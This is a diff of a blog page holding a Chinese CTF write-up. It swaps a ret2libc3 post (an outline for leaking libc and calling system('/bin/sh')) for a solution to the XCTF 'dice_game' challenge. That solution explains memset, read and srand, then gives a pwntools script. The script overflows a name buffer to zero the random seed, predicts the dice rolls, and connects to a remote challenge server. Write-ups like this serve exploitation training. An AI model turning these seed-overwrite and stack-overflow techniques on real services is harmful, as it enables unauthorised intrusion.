@@ -4,26 +4,24 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ret2libc3, 微凉">
+    <meta name="keywords" content="xctf, 微凉">
     <meta name="description" content="
+dice_game
+
 checksec
 
-run
-
-ida
-基本利用思路
-
-泄露_libc_start_main地址
-获取libc版本
-获取system地址与/bin/sh地址
-再次执行源程序
-触发栈溢出执行system(‘/bin/sh’)
 
 
-exp
 
 
-">
+
+扔进ida
+分析程序
+memset()函数
+void *memset(void *s,int c,unsigned long n);
+
+作用:
+将指针变量s所指向的前n字节的内存单元用一">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -35,7 +33,7 @@ exp
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ret2libc3 | 微凉</title>
+    <title>xctf | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -222,12 +220,12 @@ exp
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ret2libc3</h1>
+                    <h1 class="description center-align post-title">xctf</h1>
                 </div>
             </div>
         </div>
@@ -343,8 +341,8 @@ exp
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/%E7%AE%80%E5%8D%95%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87/">
+                                <span class="chip bg-color">简单随机数绕过</span>
                             </a>
                         
                     </div>
@@ -377,7 +375,7 @@ exp
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    47
+                    767
                 </div>
                 
 
@@ -402,23 +400,89 @@ exp
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li><p>checksec</p>
-<img src="/2022/01/12/ret2libc3/checksec.png" alt="image-20220112081658716" style="zoom:80%;"></li>
-<li><p>run</p>
-<img src="/2022/01/12/ret2libc3/run.png" alt="image-20220112081802038" style="zoom:80%;"></li>
-<li><p>ida</p>
-<p>基本利用思路</p>
+                <ol>
+<li><p>dice_game</p>
 <ul>
-<li>泄露_libc_start_main地址</li>
-<li>获取libc版本</li>
-<li>获取system地址与/bin/sh地址</li>
-<li>再次执行源程序</li>
-<li>触发栈溢出执行system(‘/bin/sh’)</li>
+<li><p>checksec</p>
+<img src="/2022/01/12/dice-game/checksec.png" alt="image-20220112185425348" style="zoom:80%;"></li>
 </ul>
 </li>
-<li><p>exp</p>
+</ol>
+<ul>
+<li><ul>
+<li><p>扔进ida</p>
+<p>分析程序</p>
+<p><strong>memset()函数</strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">void *memset(void *s,int c,unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>作用:</p>
+<p>将指针变量s所指向的前n字节的内存单元用一个”整数”c替换,c是int型.它可以为任何类型的数据进行初始化.</p>
+<p><strong>fflush()函数</strong>: 用于清空缓冲区,如果文件是以写的方式打开的,则把缓冲区内容写入文件.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+int fflush(FILE *stream)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>函数说明:fflush()会强制将缓冲区内的数据写回参数stream指定的文件中.如果stream为null,fflush()会将所有打开文件数据更新.</p>
+<p>fflush(stdin): 刷新缓冲区里面的东西输出到设备上去</p>
+<p>fflush(stdout): 刷新缓冲区把缓冲区里面的东西输出到设备上去</p>
+<p><strong>read()函数</strong>:</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t read(int fd,void *buf, size_t count);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>函数说明:</p>
+<p>read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中.若参数count为0,则read()不会有作用并返回0,.返回值为实际读取到的字节数,如果返回0表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.</p>
 </li>
+</ul>
+</li>
+<li><p>本题关键: <strong>重写seed</strong></p>
+</li>
+<li><p><strong>void srand</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数
+int rand(void) //rand函数用来产生随机数,当然是伪随机数.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>seed作用: srand函数的作用是根据参数seed,设置一个随机起始点,而rand函数根据这个起始点,产生随机数序列.默认的随机数种子一样,rand函数所产生的随机序列也一样.因此,为使每次程序运行都能产生不同的随机序列,每次都应一个不同的种子参数.</li>
+<li>因为rand的内部实现是用线性同余法做的,它不是真的随机数,只不过是因为其周期特别长,所以有一定的范围可看成随机的,rang()会返回一随机数值,范围在0至RAND_MAX间.在调用此函数产生随机数前,必须先利用srand()设好随机数种子,如果未设随机数种子,rand()在调用时会自动设随机数种子为1.rand()产生的是假随机数字,每次执行时相同的.若要不同,以不同的值来初始化它.初始化的函数就是srand().</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>exp</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+from ctypes import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+elf = ELF("./dice_game")
+local = 0
+if local:
+    r = process("./dice_game")
+else:
+    r = remote("111.200.241.244",53285)
+
+libc = cdll.LoadLibrary("libc.so.6") 
+
+res = []
+
+def dice_game():
+    for i in range(50):
+        rand = libc.rand()
+        res.append(rand % 6 + 1)
+    print(res)
+    
+dice_game()
+
+payload = b'a'*0x40 + p64(0)
+
+r.sendlineafter("your name: ",payload)
+
+for point in res:
+    r.sendlineafter("the point(1~6): ",str(point))
+
+flag = r.recvline()
+print(flag)
+
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/ctypes.html#module-ctypes"><code>ctypes</code></a> 导出了 <em>cdll</em> 对象在 Linux 下，必须使用 <em>包含</em> 文件扩展名的文件名来导入共享库。因此不能简单使用对象属性的方式来导入库。因此，可以使用方法 <code>LoadLibrary()</code>，或构造 CDLL 对象来导入库。</li>
 </ul>
 
                 
@@ -446,7 +510,7 @@ exp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/01/12/ret2libc3/">https://breeze-666.github.io/2022/01/12/ret2libc3/</a>
+                    <a href="https://breeze-666.github.io/2022/01/12/dice-game/">https://breeze-666.github.io/2022/01/12/dice-game/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -484,8 +548,8 @@ exp
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                    <span class="chip bg-color">栈溢出</span>
+                                <a href="/tags/%E7%AE%80%E5%8D%95%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87/">
+                                    <span class="chip bg-color">简单随机数绕过</span>
                                 </a>
                             
                         </div>
@@ -531,17 +595,18 @@ exp
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/12/buuctf/">
+                <a href="/2022/01/12/dice-game/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Buuctf 解题">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="xctf">
                         
-                        <span class="card-title">Buuctf 解题</span>
+                        <span class="card-title">xctf</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -551,9 +616,9 @@ exp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -566,11 +631,12 @@ exp
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%80%E5%8D%95wp/">
-                        <span class="chip bg-color">简单wp</span>
+                    <a href="/tags/%E7%AE%80%E5%8D%95%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87/">
+                        <span class="chip bg-color">简单随机数绕过</span>
                     </a>
                     
                 </div>
@@ -584,13 +650,13 @@ exp
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/12/ret2libc2/">
+                <a href="/2022/01/12/xctf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="ret2libc2">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="xctf">
                         
-                        <span class="card-title">ret2libc2</span>
+                        <span class="card-title">xctf</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -618,8 +684,8 @@ exp
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">栈溢出</span>
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
                     </a>
                     
                 </div>
